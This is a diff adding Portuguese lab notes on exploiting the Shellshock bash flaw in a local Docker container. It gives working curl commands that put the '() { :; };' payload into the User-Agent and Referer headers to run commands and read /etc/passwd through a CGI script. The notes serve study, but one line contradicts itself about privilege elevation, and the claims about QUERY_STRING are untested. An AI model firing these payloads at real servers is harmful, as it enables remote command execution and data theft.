@@ -1,0 +1,22 @@
+
+Abrir um bash no contentor:
+    docker exec -it shellshock /bin/bash
+
+Para executar commandos com o curl ambos funcionam:
+    
+    curl -A "() { :; }; echo; echo; /bin/bash -c 'COMANDO'" http://localhost:8080/cgi-bin/vul.cgi
+    
+    curl -e "(){:;};echo;echo;/bin/bash -c 'touch ../../tmp/2NOVA'" http://localhost:8080/cgi-bin/vul.cgi
+
+(echo; echo; é opcional é só para ver o output melhor)
+O requisito é que esta parte do header seja transformada numa "Variável de ambiente" 
+para que o bash quando ler a variavel HTTP_USER_AGENT= "() { :; }; ..." interprete como uma função
+
+É possivel descobrir o conteudo do ficheiro /etc/passwd mas não do /etc/shadow porque apenas o root consegue
+ler o ficheiro /etc/shadow e esta vunerabilidade permite executar comandos mas eleva as permissões do utilizador que as executa.
+
+HTTP GET com ? poderia ser usado para a mesma vunerabilidade porque o resultado da query é guardado na variavel de ambiente QUERY_STRING,
+mas a maneira como o browser codifica a string e a maneira como o server a descodifica porque pode modificar os comandos enviados no
+na string fazendo com que os comandos não sejam executados.
+(TBC não consegui usar este método através do browser ou do curl mas o Chatgpt diz que é possivel, secalhar pelo postman é possivel)
+
